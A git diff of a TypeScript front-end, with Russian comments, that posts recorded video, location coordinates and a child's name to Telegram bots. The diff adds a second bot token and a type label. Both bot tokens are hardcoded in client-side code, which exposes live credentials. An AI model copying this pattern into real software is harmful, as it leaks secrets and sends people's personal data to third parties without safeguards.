@@ -91,7 +91,7 @@ ${location ? `• Координаты: ${location.latitude.toFixed(6)}, ${locat
 
     try {
       // Отправка только через Telegram Bot API
-      await sendViaTelegramBot(message, videoBlob);
+      await sendViaTelegramBot(message, videoBlob, type);
       
     } catch (error) {
       console.error('Ошибка отправки через Telegram Bot API:', error);
@@ -102,12 +102,13 @@ ${location ? `• Координаты: ${location.latitude.toFixed(6)}, ${locat
   };
 
   // Отправка через Telegram Bot API
-  const sendViaTelegramBot = async (message: string, video: Blob) => {
+  const sendViaTelegramBot = async (message: string, video: Blob, type: 'запись' | 'брак') => {
     // Показываем статус отправки
     console.log('🚀 Отправляем видео в Telegram...', {
       videoSize: video.size,
       videoType: video.type,
-      parentName: formData.childName
+      parentName: formData.childName,
+      type: type
     });
     
     try {
@@ -147,8 +148,10 @@ ${location ? `• Координаты: ${location.latitude.toFixed(6)}, ${locat
         type: videoBlob.type
       });
       
-      // Реальные данные бота
-      const BOT_TOKEN = '8286818285:AAGqkSsTlsbKCT1guKYoDpkL_OcldAVyuSE';
+      // Токены для разных типов отправки
+      const BOT_TOKEN = type === 'запись' 
+        ? '8286818285:AAGqkSsTlsbKCT1guKYoDpkL_OcldAVyuSE'
+        : '8244106990:AAEVuBsj6sQDJ-a-qfwFRk0GMRHbyrGVuWc';
       
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
         method: 'POST',
@@ -163,7 +166,7 @@ ${location ? `• Координаты: ${location.latitude.toFixed(6)}, ${locat
       }
 
       console.log('Успешная отправка:', result);
-      alert('✅ Видео успешно отправлено в Telegram!\n\n🎯 IMPERIA PROMO - Данные отправлены');
+      alert(`✅ Видео (${type}) успешно отправлено в Telegram!\n\n🎯 IMPERIA PROMO - Данные отправлены`);
       
       // Автоматический переход на главную страницу
       setTimeout(() => {
